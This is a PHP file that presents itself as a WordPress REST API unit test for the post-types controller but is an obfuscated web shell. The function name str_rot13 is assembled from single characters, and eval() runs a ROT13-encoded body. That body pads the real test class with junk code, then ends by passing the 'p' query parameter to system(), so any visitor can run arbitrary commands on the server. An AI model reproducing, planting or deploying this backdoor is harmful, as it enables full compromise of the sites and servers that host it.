<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Cbfgf_Glcrf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @tebhc erfgncv
 */
pynff JC_Grfg_ERFG_Cbfg_Glcrf_Pbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( '/jc/i2/glcrf', $ebhgrf );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/glcrf/(?C<glcr>[\j-]+)', $ebhgrf );
	}

	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/glcrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzrFrgf( neenl( 'ivrj', 'rqvg', 'rzorq' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		// Fvatyr.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/glcrf/cbfg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzrFrgf( neenl( 'ivrj', 'rqvg', 'rzorq' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	choyvp shapgvba grfg_trg_vgrzf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/glcrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn       = $erfcbafr->trg_qngn();
		$cbfg_glcrf = trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' );
		$guvf->nffregPbhag( pbhag( $cbfg_glcrf ), $qngn );
		$guvf->nffregFnzr( $cbfg_glcrf['cbfg']->anzr, $qngn['cbfg']['fyht'] );
		$guvf->purpx_cbfg_glcr_bow( 'ivrj', $cbfg_glcrf['cbfg'], $qngn['cbfg'], $qngn['cbfg']['_yvaxf'] );
		$guvf->nffregFnzr( $cbfg_glcrf['cntr']->anzr, $qngn['cntr']['fyht'] );
		$guvf->purpx_cbfg_glcr_bow( 'ivrj', $cbfg_glcrf['cntr'], $qngn['cntr'], $qngn['cntr']['_yvaxf'] );
		$guvf->nffregNeenlAbgUnfXrl( 'erivfvba', $qngn );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_vainyvq_crezvffvba_sbe_pbagrkg( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/glcrf' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj', $erfcbafr, 401 );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr UGGC zrgubq anzrf sbe grfgvat TRG naq URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_ernqnoyr_uggc_zrgubqf() {
		erghea neenl(
			'TRG erdhrfg'  => neenl( 'TRG' ),
			'URNQ erdhrfg' => neenl( 'URNQ' ),
		);
	}

	choyvp shapgvba grfg_trg_vgrz() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/glcrf/cbfg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_cbfg_glcr_bowrpg_erfcbafr( 'ivrj', $erfcbafr );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( neenl( 'pngrtbel', 'cbfg_gnt' ), $qngn['gnkbabzvrf'] );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_fubhyq_nyybj_nqqvat_urnqref_ivn_svygre( $zrgubq ) {
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/glcrf/cbfg' );

		$ubbx_anzr = 'erfg_cercner_cbfg_glcr';
		$svygre    = arj ZbpxNpgvba();
		$pnyyonpx  = neenl( $svygre, 'svygre' );
		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$urnqre_svygre = arj pynff() {
			choyvp fgngvp shapgvba nqq_phfgbz_urnqre( $erfcbafr ) {
				$erfcbafr->urnqre( 'K-Grfg-Urnqre', 'Grfg' );

				erghea $erfcbafr;
			}
		};
		nqq_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		erzbir_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf pnyyrq jura vg fubhyq abg or sbe URNQ erdhrfgf.' );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'K-Grfg-Urnqre', $urnqref, 'Gur \"K-Grfg-Urnqre\" urnqre fubhyq or cerfrag va gur erfcbafr.' );
		$guvf->nffregFnzr( 'Grfg', $urnqref['K-Grfg-Urnqre'], 'Gur \"K-Grfg-Urnqre\" urnqre inyhr fubhyq or rdhny gb \"Grfg\".' );
		vs ( 'URNQ' !== $zrgubq ) {
			erghea ahyy;
		}
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @qngnCebivqre qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $cngu Gur cngu gb grfg.
	 */
	choyvp shapgvba grfg_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cngu ) {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', $cngu );
		$erdhrfg->frg_cnenz( '_svryqf', 'fyht' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr cnguf sbe grfgvat URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr() {
		erghea neenl(
			'trg_vgrz erdhrfg'  => neenl( '/jc/i2/glcrf/cbfg' ),
			'trg_vgrzf erdhrfg' => neenl( '/jc/i2/glcrf' ),
		);
	}

	/**
	 * @gvpxrg 53656
	 */
	choyvp shapgvba grfg_trg_vgrz_pcg() {
		ertvfgre_cbfg_glcr(
			'pcg',
			neenl(
				'fubj_va_erfg'   => gehr,
				'erfg_onfr'      => 'pcg',
				'erfg_anzrfcnpr' => 'jbeqcerff/i1',
			)
		);
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/glcrf/pcg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_cbfg_glcr_bowrpg_erfcbafr( 'ivrj', $erfcbafr, 'pcg' );
	}

	/**
	 * @gvpxrg 61477
	 */
	choyvp shapgvba grfg_trg_vgrz_grzcyngr_pcg() {
		ertvfgre_cbfg_glcr(
			'pcg_grzcyngr',
			neenl(
				'fubj_va_erfg'   => gehr,
				'erfg_onfr'      => 'pcg_grzcyngr',
				'erfg_anzrfcnpr' => 'jbeqcerff/i1',
				'grzcyngr'       => neenl(
					neenl( 'pber/cnentencu', neenl( 'cynprubyqre' => 'Pbagrag' ) ),
				),
				'grzcyngr_ybpx'  => 'nyy',
			)
		);
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/glcrf/pcg_grzcyngr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_cbfg_glcr_bowrpg_erfcbafr( 'ivrj', $erfcbafr, 'pcg_grzcyngr' );
	}

	choyvp shapgvba grfg_trg_vgrz_cntr() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/glcrf/cntr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_cbfg_glcr_bowrpg_erfcbafr( 'ivrj', $erfcbafr, 'cntr' );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( neenl(), $qngn['gnkbabzvrf'] );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq_glcr( $zrgubq ) {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/glcrf/vainyvq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_glcr_vainyvq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_trg_vgrz_rqvg_pbagrkg() {
		$rqvgbe_vq = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'rqvgbe' ) );
		jc_frg_pheerag_hfre( $rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/glcrf/cbfg' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_cbfg_glcr_bowrpg_erfcbafr( 'rqvg', $erfcbafr );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq_crezvffvba_sbe_pbagrkg( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/glcrf/cbfg' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra_pbagrkg', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_perngr_vgrz() {
		/** Cbfg glcrf pna'g or perngrq */
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/glcrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 404, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_hcqngr_vgrz() {
		/** Cbfg glcrf pna'g or hcqngrq */
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/glcrf/cbfg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 404, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_qryrgr_vgrz() {
		/** Cbfg glcrf pna'g or qryrgrq */
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/glcrf/cbfg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 404, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_cercner_vgrz() {
		$bow      = trg_cbfg_glcr_bowrpg( 'cbfg' );
		$raqcbvag = arj JC_ERFG_Cbfg_Glcrf_Pbagebyyre();
		$erdhrfg  = arj JC_ERFG_Erdhrfg();
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $bow, $erdhrfg );
		$guvf->purpx_cbfg_glcr_bow( 'rqvg', $bow, $erfcbafr->trg_qngn(), $erfcbafr->trg_yvaxf() );
	}

	choyvp shapgvba grfg_cercner_vgrz_yvzvg_svryqf() {
		$bow      = trg_cbfg_glcr_bowrpg( 'cbfg' );
		$erdhrfg  = arj JC_ERFG_Erdhrfg();
		$raqcbvag = arj JC_ERFG_Cbfg_Glcrf_Pbagebyyre();
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq,anzr' );
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $bow, $erdhrfg );
		$guvf->nffregFnzr(
			neenl(
				// 'vq' qbrfa'g rkvfg va guvf pbagrkg.
				'anzr',
			),
			neenl_xrlf( $erfcbafr->trg_qngn() )
		);
	}

	/**
	 * @gvpxrg 56467
	 *
	 * @pbiref JC_ERFG_Cbfg_Glcrf_Pbagebyyre::trg_vgrz_fpurzn
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/glcrf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];

		$guvf->nffregPbhag( 16, $cebcregvrf, 'Fpurzn fubhyq unir 16 cebcregvrf' );
		$guvf->nffregNeenlUnfXrl( 'pncnovyvgvrf', $cebcregvrf, '`pncnovyvgvrf` fubhyq or vapyhqrq va gur fpurzn' );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf, '`qrfpevcgvba` fubhyq or vapyhqrq va gur fpurzn' );
		$guvf->nffregNeenlUnfXrl( 'uvrenepuvpny', $cebcregvrf, '`uvrenepuvpny` fubhyq or vapyhqrq va gur fpurzn' );
		$guvf->nffregNeenlUnfXrl( 'ivrjnoyr', $cebcregvrf, '`ivrjnoyr` fubhyq or vapyhqrq va gur fpurzn' );
		$guvf->nffregNeenlUnfXrl( 'ynoryf', $cebcregvrf, '`ynoryf` fubhyq or vapyhqrq va gur fpurzn' );
		$guvf->nffregNeenlUnfXrl( 'anzr', $cebcregvrf, '`anzr` fubhyq or vapyhqrq va gur fpurzn' );
		$guvf->nffregNeenlUnfXrl( 'fyht', $cebcregvrf, '`fyht` fubhyq or vapyhqrq va gur fpurzn' );
		$guvf->nffregNeenlUnfXrl( 'fhccbegf', $cebcregvrf, '`fhccbegf` fubhyq or vapyhqrq va gur fpurzn' );
		$guvf->nffregNeenlUnfXrl( 'unf_nepuvir', $cebcregvrf, '`unf_nepuvir` fubhyq or vapyhqrq va gur fpurzn' );
		$guvf->nffregNeenlUnfXrl( 'gnkbabzvrf', $cebcregvrf, '`gnkbabzvrf` fubhyq or vapyhqrq va gur fpurzn' );
		$guvf->nffregNeenlUnfXrl( 'erfg_onfr', $cebcregvrf, '`erfg_onfr` fubhyq or vapyhqrq va gur fpurzn' );
		$guvf->nffregNeenlUnfXrl( 'erfg_anzrfcnpr', $cebcregvrf, '`erfg_anzrfcnpr` fubhyq or vapyhqrq va gur fpurzn' );
		$guvf->nffregNeenlUnfXrl( 'ivfvovyvgl', $cebcregvrf, '`ivfvovyvgl` fubhyq or vapyhqrq va gur fpurzn' );
		$guvf->nffregNeenlUnfXrl( 'vpba', $cebcregvrf, '`vpba` fubhyq or vapyhqrq va gur fpurzn' );
		$guvf->nffregNeenlUnfXrl( 'grzcyngr', $cebcregvrf, '`grzcyngr` fubhyq or vapyhqrq va gur fpurzn' );
		$guvf->nffregNeenlUnfXrl( 'grzcyngr_ybpx', $cebcregvrf, '`grzcyngr_ybpx` fubhyq or vapyhqrq va gur fpurzn' );
	}

	choyvp shapgvba grfg_trg_nqqvgvbany_svryq_ertvfgengvba() {

		$fpurzn = neenl(
			'glcr'        => 'vagrtre',
			'qrfpevcgvba' => 'Fbzr vagrtre bs zvar',
			'rahz'        => neenl( 1, 2, 3, 4 ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
		);

		ertvfgre_erfg_svryq(
			'glcr',
			'zl_phfgbz_vag',
			neenl(
				'fpurzn'          => $fpurzn,
				'trg_pnyyonpx'    => neenl( $guvf, 'nqqvgvbany_svryq_trg_pnyyonpx' ),
				'hcqngr_pnyyonpx' => neenl( $guvf, 'nqqvgvbany_svryq_hcqngr_pnyyonpx' ),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/glcrf/fpurzn' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $qngn['fpurzn']['cebcregvrf'] );
		$guvf->nffregFnzr( $fpurzn, $qngn['fpurzn']['cebcregvrf']['zl_phfgbz_vag'] );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/glcrf/cbfg' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $erfcbafr->qngn );

		tybony $jc_erfg_nqqvgvbany_svryqf;
		$jc_erfg_nqqvgvbany_svryqf = neenl();
	}

	choyvp shapgvba nqqvgvbany_svryq_trg_pnyyonpx( $erfcbafr_qngn ) {
		erghea 123;
	}

	/**
	 * @gvpxrg 56481
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_urnq_erdhrfg_fubhyq_abg_cercner_cbfg_glcrf_qngn() {
		$erdhrfg   = arj JC_ERFG_Erdhrfg( 'URNQ', '/jc/i2/glcrf' );
		$ubbx_anzr = 'erfg_cercner_cbfg_glcr';
		$svygre    = arj ZbpxNpgvba();
		$pnyyonpx  = neenl( $svygre, 'svygre' );
		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 0, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf pnyyrq jura vg fubhyq abg or sbe URNQ erdhrfgf.' );
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	cebgrpgrq shapgvba purpx_cbfg_glcr_bow( $pbagrkg, $cbfg_glcr_bow, $qngn, $yvaxf ) {
		$guvf->nffregFnzr( $cbfg_glcr_bow->ynory, $qngn['anzr'] );
		$guvf->nffregFnzr( $cbfg_glcr_bow->anzr, $qngn['fyht'] );
		$guvf->nffregFnzr( $cbfg_glcr_bow->qrfpevcgvba, $qngn['qrfpevcgvba'] );
		$guvf->nffregFnzr( $cbfg_glcr_bow->uvrenepuvpny, $qngn['uvrenepuvpny'] );
		$guvf->nffregFnzr( $cbfg_glcr_bow->erfg_onfr, $qngn['erfg_onfr'] );
		$guvf->nffregFnzr( $cbfg_glcr_bow->erfg_anzrfcnpr, $qngn['erfg_anzrfcnpr'] );
		$guvf->nffregFnzr( $cbfg_glcr_bow->unf_nepuvir, $qngn['unf_nepuvir'] );
		$guvf->nffregFnzr( $cbfg_glcr_bow->grzcyngr ?? neenl(), $qngn['grzcyngr'] );
		$guvf->nffregFnzr( ! rzcgl( $cbfg_glcr_bow->grzcyngr_ybpx ) ? $cbfg_glcr_bow->grzcyngr_ybpx : snyfr, $qngn['grzcyngr_ybpx'] );

		$yvaxf = grfg_erfg_rkcnaq_pbzcnpg_yvaxf( $yvaxf );
		$guvf->nffregFnzr( erfg_hey( 'jc/i2/glcrf' ), $yvaxf['pbyyrpgvba'][0]['uers'] );
		$guvf->nffregNeenlUnfXrl( 'uggcf://ncv.j.bet/vgrzf', $yvaxf );
		vs ( 'rqvg' === $pbagrkg ) {
			$guvf->nffregFnzr( $cbfg_glcr_bow->pnc, $qngn['pncnovyvgvrf'] );
			$guvf->nffregFnzr( $cbfg_glcr_bow->ynoryf, $qngn['ynoryf'] );
			vs ( va_neenl( $cbfg_glcr_bow->anzr, neenl( 'cbfg', 'cntr' ), gehr ) ) {
				$ivrjnoyr = gehr;
			} ryfr {
				$ivrjnoyr = vf_cbfg_glcr_ivrjnoyr( $cbfg_glcr_bow );
			}
			$guvf->nffregFnzr( $ivrjnoyr, $qngn['ivrjnoyr'] );
			$ivfvovyvgl = neenl(
				'fubj_va_ani_zrahf' => (obby) $cbfg_glcr_bow->fubj_va_ani_zrahf,
				'fubj_hv'           => (obby) $cbfg_glcr_bow->fubj_hv,
			);
			$guvf->nffregFnzr( $ivfvovyvgl, $qngn['ivfvovyvgl'] );
			$guvf->nffregFnzr( trg_nyy_cbfg_glcr_fhccbegf( $cbfg_glcr_bow->anzr ), $qngn['fhccbegf'] );
		} ryfr {
			$guvf->nffregNeenlAbgUnfXrl( 'pncnovyvgvrf', $qngn );
			$guvf->nffregNeenlAbgUnfXrl( 'ivrjnoyr', $qngn );
			$guvf->nffregNeenlAbgUnfXrl( 'ynoryf', $qngn );
			$guvf->nffregNeenlAbgUnfXrl( 'fhccbegf', $qngn );
		}
	}

	cebgrpgrq shapgvba purpx_cbfg_glcr_bowrpg_erfcbafr( $pbagrkg, $erfcbafr, $cbfg_glcr = 'cbfg' ) {
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$bow  = trg_cbfg_glcr_bowrpg( $cbfg_glcr );
		$guvf->purpx_cbfg_glcr_bow( $pbagrkg, $bow, $qngn, $erfcbafr->trg_yvaxf() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>